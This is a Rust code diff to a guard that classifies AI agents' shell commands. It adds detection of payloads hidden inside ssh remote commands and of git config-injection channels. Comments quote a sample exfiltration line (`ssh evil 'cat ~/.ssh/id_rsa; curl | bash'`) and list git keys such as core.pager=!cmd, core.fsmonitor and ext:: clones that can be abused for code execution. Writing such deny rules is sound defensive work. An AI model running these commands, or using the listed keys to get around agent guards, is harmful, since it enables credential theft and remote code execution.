@@ -226,6 +226,9 @@ fn classify_script_with_depth(script: &Script, depth: usize) -> Decision {
         if let Some(reason) = rsync_dash_e_inner(pipeline, depth) {
             return Decision::Deny { reason };
         }
+        if let Some(reason) = git_config_injection(pipeline) {
+            return Decision::Deny { reason };
+        }
         if let Some(reason) = m2_git_hard_deny(pipeline) {
             return Decision::Deny { reason };
         }
@@ -396,6 +399,20 @@ fn extract_wrapper_inner(stage: &crate::parser::Command) -> Option<String> {
             return Some(inner);
         }
     }
+    // --- ssh [opts] [user@]host CMD...
+    //
+    // 1.2.0 5th-pass review (Claude SEVERE S-3): `ssh host 'curl|bash'`
+    // executes the inner argv as a shell command on the REMOTE host.
+    // Classically remote-only execution would be out-of-scope — but an
+    // agent issuing `ssh evil 'cat ~/.ssh/id_rsa; curl | bash'` is
+    // still shipping a payload and potentially laundering credentials.
+    // We classify the inner as if it were local bash: any deny shape
+    // (curl|bash, secret exfil, persistence) denies the outer ssh.
+    if basename == "ssh" {
+        if let Some(inner) = extract_ssh_remote_command(&stage.args) {
+            return Some(inner);
+        }
+    }
     // --- Prefix runners: first non-flag, non-assignment arg is the
     // inner command name; remaining args are its argv.
     if matches!(
@@ -477,6 +494,62 @@ fn extract_env_dash_s(args: &[String]) -> Option<String> {
         }
     }
     None
+}
+
+/// Extract the remote shell command from an `ssh` invocation.
+///
+/// Shape: `ssh [ssh-opts] [user@]host [command...]`. Skip ssh's own
+/// flags (many take values: `-i`, `-p`, `-o`, `-l`, `-L`, `-R`, `-D`,
+/// `-J`, `-F`, `-b`, `-c`, `-m`, `-O`, `-Q`, `-S`, `-W`, `-w`, `-E`,
+/// `-B`, `-e`). The first positional is the host. Everything AFTER
+/// that is joined with spaces and returned as an inner command string
+/// (ssh joins them exactly this way before invoking the remote shell).
+///
+/// Returns `None` when:
+/// - no positional host is found, or
+/// - the invocation has no inner command (plain interactive login).
+///
+/// 1.2.0 5th-pass adversarial review (Claude SEVERE S-3).
+fn extract_ssh_remote_command(args: &[String]) -> Option<String> {
+    // ssh short flags that take a value (OpenSSH ssh(1)).
+    const VALUE_TAKING: &[&str] = &[
+        "-i", "-p", "-o", "-l", "-L", "-R", "-D", "-J", "-F", "-b", "-c",
+        "-m", "-O", "-Q", "-S", "-W", "-w", "-E", "-B", "-e",
+    ];
+    let mut i = 0;
+    let mut host_index: Option<usize> = None;
+    while i < args.len() {
+        let a = &args[i];
+        if a == "--" {
+            // POSIX end-of-options: next positional is the host.
+            if i + 1 < args.len() {
+                host_index = Some(i + 1);
+            }
+            break;
+        }
+        if a.starts_with('-') {
+            if VALUE_TAKING.contains(&a.as_str()) {
+                i += 2;
+                continue;
+            }
+            // Attached forms like `-p22`, `-ofoo=bar`, `-i/key`.
+            // These don't consume a second argv.
+            i += 1;
+            continue;
+        }
+        // First positional is the host.
+        host_index = Some(i);
+        break;
+    }
+    let host_index = host_index?;
+    let rest = &args[host_index + 1..];
+    if rest.is_empty() {
+        return None;
+    }
+    // ssh joins the remaining argv with spaces before sending to the
+    // remote shell — replicate that so the existing parser sees a
+    // normal bash command string.
+    Some(rest.join(" "))
 }
 
 /// Scan `args` for a `-c`-style flag and return the command string.
@@ -2111,6 +2184,97 @@ fn network_tool_word_regex() -> &'static regex::Regex {
         )
         .expect("network-tool regex compiles")
     })
+}
+
+/// Deny well-known `git -c KEY=VALUE` RCE channels and adjacent
+/// config-injection shapes. `git` respects per-invocation config
+/// overrides, and several core keys cause arbitrary command
+/// execution on the next git operation:
+///
+/// - `core.pager=!cmd` — runs cmd before displaying output
+/// - `core.editor=cmd`
+/// - `core.hooksPath=path` + shipped hook
+/// - `core.fsmonitor=cmd` — executed on every status
+/// - `core.sshCommand=cmd`
+/// - `protocol.ext.allow=always` + `clone ext::sh -c '...'`
+/// - `uploadpack.packObjectsHook=cmd` (on `git push`)
+/// - `http.proxy=http://127.0.0.1:XXXX` — SSRF-adjacent
+///
+/// The `!` prefix on `core.pager` / `alias.*` values is git's
+/// shell-escape marker and is always suspicious coming from an
+/// agent.
+///
+/// Also denies `git clone ext::...` regardless of a `-c` override
+/// because tree-sitter can't tell whether the user has
+/// `protocol.ext.allow=always` already configured — fail closed.
+///
+/// 1.2.0 5th-pass adversarial review (Claude SEVERE S-4).
+fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
+    const DANGEROUS_KEYS: &[&str] = &[
+        "core.pager",
+        "core.editor",
+        "core.hookspath",
+        "core.fsmonitor",
+        "core.sshcommand",
+        "core.askpass",
+        "protocol.ext.allow",
+        "uploadpack.packobjectshook",
+        "http.proxy",
+        "https.proxy",
+        "pack.packsizelimit",
+        "credential.helper",
+    ];
+    for stage in &pipeline.stages {
+        if stage_bn_lc(stage) != "git" {
+            continue;
+        }
+        let args = &stage.args;
+        // Walk args: `-c KEY=VAL` OR `-c=KEY=VAL` (rare).
+        let mut i = 0;
+        while i < args.len() {
+            let a = &args[i];
+            let kv: Option<&str> = if a == "-c" {
+                args.get(i + 1).map(String::as_str)
+            } else {
+                a.strip_prefix("-c=")
+            };
+            if let Some(kv) = kv {
+                let lower = kv.to_ascii_lowercase();
+                // Any dangerous key triggers the deny. Match on the
+                // `KEY=` prefix so `core.pager=whatever` is caught
+                // without being fooled by `core.pagerabc=…`.
+                for key in DANGEROUS_KEYS {
+                    if lower.starts_with(&format!("{key}=")) {
+                        return Some(format!(
+                            "blocked: `git -c {kv}` overrides a config \
+                             key that git will execute as a shell \
+                             command on the next operation. This is a \
+                             well-known RCE channel (`core.pager=!…`, \
+                             `core.fsmonitor`, `protocol.ext.allow`, \
+                             etc.).",
+                        ));
+                    }
+                }
+            }
+            // `git clone ext::…` — external-transport helper. Without
+            // `protocol.ext.allow=always` it fails, but fail closed:
+            // we can't tell whether a site config has already
+            // enabled it.
+            if a == "clone" || i > 0 && args[i - 1] == "clone" {
+                if let Some(url) = args.iter().find(|s| s.starts_with("ext::")) {
+                    return Some(format!(
+                        "blocked: `git clone {url}` uses the `ext::` \
+                         transport helper, which executes an arbitrary \
+                         shell command as the transport. Requires \
+                         `protocol.ext.allow=always` but we fail \
+                         closed — never legitimate from an agent.",
+                    ));
+                }
+            }
+            i += 1;
+        }
+    }
+    None
 }
 
 /// M2 `BARBICAN_GIT_HARD_DENY=1` promotes bare `git` to an
